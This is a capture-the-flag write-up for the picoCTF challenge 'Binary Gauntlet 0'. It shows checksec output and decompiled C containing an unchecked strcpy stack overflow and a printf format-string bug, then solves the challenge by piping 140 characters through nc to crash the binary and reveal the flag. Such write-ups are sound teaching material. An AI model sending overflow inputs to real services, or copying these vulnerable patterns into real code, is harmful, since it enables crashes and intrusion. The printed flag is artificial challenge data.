# Binary Gauntlet 0
Category: Binary Exploitation, 10 points

## Description

> This series of problems has to do with binary protections and how they affect a very simple program. How far can you make it in the gauntlet?

A binary file was attached.

## Solution

Let's run `checksec` on the file:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_0]
└─$ checksec --file=gauntlet
[*] '/media/sf_CTFs/pico/Binary_Gauntlet_0/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We can see that there are virtually no protections for this program.

Using Ghidra, we can check the decompiled output of the program:

```c
void sigsegv_handler(void)
{
  fprintf(stderr,"%s\n",flag);
  fflush(stderr);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

undefined8 main(void)
{
  char local_88 [108];
  __gid_t local_1c;
  FILE *local_18;
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag,0x40,local_18);
  signal(0xb,sigsegv_handler);
  local_1c = getegid();
  setresgid(local_1c,local_1c,local_1c);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_88,local_10);
  return 0;
}
```

We can see that the program sets up a SIGSEGV handler, which gets called when a segmentation fault occurs. Conveniently, this handler just prints the flag. So all we need to do is cause a segmentation fault. Notice how the program reads up to 1000 characters from the standard input via `fgets(local_10,1000,stdin)`, then calls `strcpy(local_88,local_10)` to copy the input to a much shorter local variable: `char local_88 [108]`. Therefore, if we provide an input somewhat longer than `108`, we'll overflow the stack and corrupt the execution, causing the program to segfault.

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Binary_Gauntlet_0]
└─$ python3 -c "print('a'*140)" |  nc mercury.picoctf.net 37752
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
9595dc79e46ae416c5383d858afbb624
```

The flag: `9595dc79e46ae416c5383d858afbb624`